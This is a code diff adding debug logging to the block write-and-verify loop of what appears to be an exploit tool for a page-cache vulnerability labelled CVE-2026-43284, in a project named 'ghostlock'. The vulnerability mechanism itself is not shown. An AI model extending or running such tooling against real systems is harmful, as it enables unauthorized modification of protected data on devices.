@@ -1,6 +1,7 @@
 /** @file backend/cve_2026_43284/steps/pagecache_steps.cpp
  *  The block loop every image write shares. See the header for the boundary.
  */
+#include "jni/gl_log.hpp"
 #include <chrono>
 #include "backend/cve_2026_43284/steps/pagecache_steps.hpp"
 
@@ -232,12 +233,23 @@ namespace ghostlock::backend::cve_2026_43284::steps {
             const auto verify_deadline = std::chrono::steady_clock::now() +
                                          std::chrono::milliseconds(request.budget_ms);
             for (;;) {
-                const auto back = request.access->read(0U, request.width, request.channel, *request.params);
+                GL_LOGI("block[%zu]: wrote=%zu/%zu offset=%llu", at, written.value, request.width,
+                    static_cast<unsigned long long>(request.offset + at));
+            const auto back = request.access->read(0U, request.width, request.channel, *request.params);
                 if (back.ok() && back.value.size() == request.width &&
                     std::memcmp(back.value.data(), in, request.width) == 0) {
                     break;  /* landed：预算内比中 */
                 }
                 if (std::chrono::steady_clock::now() >= verify_deadline) {
+                    const unsigned char *want = reinterpret_cast<const unsigned char *>(in);
+                    const unsigned char *got = back.ok() ? reinterpret_cast<const unsigned char *>(back.value.data()) : nullptr;
+                    if (got != nullptr && back.value.size() == request.width) {
+                        GL_LOGI("block[%zu] verify failed: want %02x%02x%02x%02x got %02x%02x%02x%02x", at,
+                                want[0], want[1], want[2], want[3], got[0], got[1], got[2], got[3]);
+                    } else {
+                        GL_LOGI("block[%zu] verify failed: want %02x%02x%02x%02x got unreadable (ok=%d size=%zu)", at,
+                                want[0], want[1], want[2], want[3], back.ok() ? 1 : 0, back.value.size());
+                    }
                     *refusal = kVerifyFailed;  /* budget-exhausted：预算用尽仍不中 */
                     return false;
                 }
